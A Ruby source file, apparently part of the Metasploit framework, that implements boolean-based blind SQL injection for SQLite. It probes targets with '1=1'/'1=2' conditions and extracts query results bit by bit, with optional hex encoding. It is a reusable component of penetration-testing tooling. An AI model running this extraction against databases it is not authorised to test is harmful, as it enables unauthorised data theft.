#
#   Boolean-Based Blind SQL injection support for SQLite
#
class Msf::Exploit::SQLi::SQLitei::BooleanBasedBlind < Msf::Exploit::SQLi::SQLitei::Common
  #
  #   Gets the output of the given SQL query, in a boolean-based blind manner.
  #   The block given to initialize must return true if querying its parameter
  #   gave a result, false otherwise.
  #   @param query [String] The SQL query to execute
  #   @return [String] The query results
  #
  def run_sql(query, output_charset = nil)
    # TODO: detect latency and update sleepdelay manually?
    if output_charset.is_a?(Range) && output_charset.count > 0
      known_bits, bits_to_guess = get_bitmask(output_charset)
    else
      known_bits = 0
      bits_to_guess = 8
    end
    puts "[*] Executing (#{query})" if @verbose
    if @hex_encode_strings
      query = hex_encode_strings(query)
      puts "[*] Encoded to (#{query})" if @verbose
    end
    # first, get the length of the output
    output_length = blind_detect_length(query, false)
    puts "[*] Time-based injection: expecting output of length #{output_length}" if @verbose
    # now, get the output, of the given length
    print '[+] Data: ' if @verbose
    blind_dump_data(query, output_length, known_bits, bits_to_guess, false)
  end

  #
  # This method checks if the target is vulnerable to Blind boolean-based injection by checking that
  # the values returned by the bloc for some boolean queries are correct.
  #
  def test_vulnerable
    out_true = blind_request('1=1')
    out_false = blind_request('1=2')
    out_true && !out_false
  end

  private

  #
  # Performs one request, should leak one bit of information
  # (if return value is not false or nil, 1, 0 otherwise)
  #
  def blind_request(query)
    @query_proc.call(query)
  end
end
